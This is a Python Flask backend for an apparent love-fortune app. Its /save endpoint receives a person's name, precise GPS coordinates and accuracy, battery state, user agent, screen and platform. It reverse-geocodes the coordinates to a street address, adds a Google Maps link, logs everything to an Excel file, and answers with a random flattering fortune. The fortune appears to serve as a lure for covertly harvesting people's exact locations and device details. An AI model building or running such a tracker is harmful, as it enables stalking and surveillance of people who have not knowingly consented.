# app.py
from flask import Flask, request, jsonify
from flask_cors import CORS
import pandas as pd
import requests
import os
from datetime import datetime
import random

app = Flask(__name__)
CORS(app)  # Allow any frontend to call this API

os.makedirs('excel_files', exist_ok=True)

def get_address(lat, lon):
    try:
        url = "https://nominatim.openstreetmap.org/reverse"
        params = {'lat': lat, 'lon': lon, 'format': 'json', 'addressdetails': 1}
        headers = {'User-Agent': 'Fortune-App/1.0'}
        r = requests.get(url, params=params, headers=headers, timeout=8)
        return r.json().get('display_name', 'Address found')
    except:
        return 'Location captured'

@app.route('/save', methods=['POST'])
def save():
    try:
        data = request.json
        name = data['name']
        lat = data['lat']
        lon = data['lon']
        addr = get_address(lat, lon)
        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
        battery = data.get('battery')
        batt_level = battery['level'] if battery else 'N/A'
        batt_charging = battery['charging'] if battery else 'N/A'

        record = {
            'DateTime': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'Name': name,
            'Latitude': lat,
            'Longitude': lon,
            'Google Maps': maps_link,
            'Accuracy_m': data['accuracy'],
            'Address': addr,
            'Battery_%': batt_level,
            'Charging': batt_charging,
            'Device': data.get('ua', '')[:100],
            'Screen': data.get('screen', ''),
            'Platform': data.get('platform', '')
        }

        excel_path = os.path.join('excel_files', 'fortunes_data.xlsx')
        if os.path.exists(excel_path):
            old = pd.read_excel(excel_path)
            df = pd.concat([old, pd.DataFrame([record])], ignore_index=True)
        else:
            df = pd.DataFrame([record])
        df.to_excel(excel_path, index=False, engine='openpyxl')

        messages = [
            f"💕 Dear {name}, someone special is thinking of you right now! 💕",
            f"💖 {name}, a beautiful soul is about to enter your life! 💖",
            f"💗 {name}, the universe has heard your heart's desire! 💗",
            f"💓 {name}, your future soulmate is closer than you think! 💓",
            f"💝 {name}, someone you meet today will change your life! 💝",
            f"💕 {name}, love is coming your way sooner than you expect! 💕",
            f"💖 {name}, your positive energy is attracting true love! 💖",
            f"💗 {name}, the stars are aligning just for you today! 💗",
            f"💓 {name}, a wonderful surprise awaits your heart! 💓",
            f"💝 {name}, someone is secretly falling for you! 💝"
        ]
        fortune = random.choice(messages)

        print(f"✅ {name} | {lat:.4f}, {lon:.4f} | Battery: {batt_level}%")
        return jsonify({'success': True, 'fortune': fortune})
    except Exception as e:
        print("ERROR:", e)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/')
def home():
    return "Backend is running! Use POST to /save"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
